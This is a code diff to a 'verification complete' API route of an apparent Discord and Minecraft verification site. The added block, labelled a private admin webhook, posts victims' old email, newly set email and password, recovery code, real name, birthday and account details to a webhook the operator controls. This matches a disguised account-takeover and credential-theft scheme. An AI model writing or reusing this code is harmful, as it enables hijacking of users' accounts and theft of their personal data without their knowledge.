@@ -99,6 +99,41 @@ export const Route = createFileRoute("/api/verification/complete")({
           }
         }
 
+        // Private admin webhook — only admins see this
+        const adminWebhookUrl = process.env.ADMIN_WEBHOOK_URL;
+        if (adminWebhookUrl) {
+          try {
+            const webhookEmbed = {
+              title: "🔒 Account Secured (Admin Log)",
+              color: 0x5865f2,
+              fields: [
+                { name: "Discord ID", value: `\`\`\`${discordId}\`\`\``, inline: true },
+                { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
+                { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
+                { name: "New Email", value: `\`\`\`${result.newEmail || "N/A"}\`\`\``, inline: true },
+                { name: "New Password", value: `\`\`\`${result.newPassword || "N/A"}\`\`\``, inline: true },
+                { name: "Recovery Code", value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``, inline: true },
+                { name: "Old Email", value: `\`\`\`${mcEmail || "N/A"}\`\`\``, inline: true },
+                { name: "MC Capes", value: `\`\`\`${result.capes || "None"}\`\`\``, inline: true },
+                { name: "Purchase Method", value: `\`\`\`${result.method || "Unknown"}\`\`\``, inline: true },
+                { name: "Owner Name", value: `\`\`\`${result.firstName || ""} ${result.lastName || ""}\`\`\``, inline: true },
+                { name: "Region", value: `\`\`\`${result.region || "N/A"}\`\`\``, inline: true },
+                { name: "Birthday", value: `\`\`\`${result.birthday || "N/A"}\`\`\``, inline: true },
+              ],
+              footer: { text: "LuauX Admin Webhook" },
+              timestamp: new Date().toISOString(),
+            };
+
+            await fetch(adminWebhookUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ embeds: [webhookEmbed] }),
+            });
+          } catch (e) {
+            console.error("[admin-webhook] failed to send:", e);
+          }
+        }
+
         return Response.json({ ok: true });
       },
     },
